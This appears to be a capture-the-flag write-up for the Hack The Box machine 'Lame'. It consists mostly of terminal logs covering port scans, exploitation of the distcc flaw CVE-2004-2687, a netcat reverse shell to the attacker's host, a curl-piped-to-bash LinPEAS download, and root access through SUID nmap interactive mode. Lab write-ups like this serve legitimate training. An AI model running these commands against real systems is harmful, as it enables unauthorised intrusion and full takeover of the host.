# Scan ports

```bash
ghost@localhost [21:57:27] [~/Documents/tj-null-boxes/Lame] [master *]
-> % rustscan -a 10.10.10.3 -- -sC -sV
Open 10.10.10.3:21
Open 10.10.10.3:22
Open 10.10.10.3:139
Open 10.10.10.3:445
Open 10.10.10.3:3632
```

```bash
ghost@localhost [22:19:25] [~/Documents/tj-null-boxes/Lame] [master *]
-> % nmap 10.10.10.3 -p 21,22,139,445,3632 -sC -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 22:19 UTC
Nmap scan report for 10.10.10.3
Host is up (0.58s latency).

PORT     STATE SERVICE
21/tcp   open  ftp
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh
| ssh-hostkey:
|_  1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name:
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-08-20T10:06:46-04:00
|_clock-skew: mean: -6h12m55s, deviation: 2h49m46s, median: -8h12m58s
```

<br/>

# Distributed C/C++ compiler server (3632)

https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html

The server is vulnerable to CVE-2004-2687.

```bash
ghost@localhost [22:52:43] [~/Documents/tj-null-boxes/Lame] [master *]
-> % nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'" -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 22:52 UTC
Nmap scan report for 10.10.10.3
Host is up (0.63s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687:
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|
|     Disclosure date: 2002-02-01
|     Extra information:
|
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|
|     References:
|       https://distcc.github.io/security.html
|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687

Nmap done: 1 IP address (1 host up) scanned in 2.44 seconds
```

<br/>

# Exploiting CVE-2004-2687

```bash
ghost@localhost [22:59:13] [~/Documents/tj-null-boxes/Lame] [master *]
https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html
-> % nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.1 443 -e /bin/bash'" -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 22:59 UTC
Nmap scan report for 10.10.10.3
Host is up (0.56s latency).

PORT     STATE SERVICE
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 31.38 seconds
```

```bash
ghost@localhost [22:57:09] [~/Documents/tj-null-boxes/Lame] [master *]
-> % nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.1] from (UNKNOWN) [10.10.10.3] 38035
```

<br/>

# Privilege Escalation with Linpeas

Linpeas is hosted in Kali machine, download to the target machine via curl.

nmap has root SUID permission.

```bash
daemon@lame:/tmp$ curl 10.10.14.1:8000/linpeas.sh | bash
curl 10.10.14.1:8000/linpeas.sh | bash

════════════════════════════════════╣ Basic information ╠════════════════════════════════════
OS: Linux version 2.6.24-16-server (buildd@palmer) (gcc version 4.2.3 (Ubuntu 4.2.3-2ubuntu7)) #1 SMP Thu Apr 10 13:58:00 UTC 2008
User & Groups: uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
Hostname: lame
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
[+] nmap is available for network discover & port scanning, you should use it yourself

...

════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
...
-rwsr-xr-x 1 root root 763K Apr  8  2008 /usr/bin/nmap
...
```

<br/>

# Root access via nmap

```bash
daemon@lame:/tmp$ nmap --interactive
nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !whoami
root

nmap> !ls /home
ftp  makis  service  user

nmap> !cat /home/makis/user.txt
087f*********

nmap> !cat /root/root.txt
b052*********
```
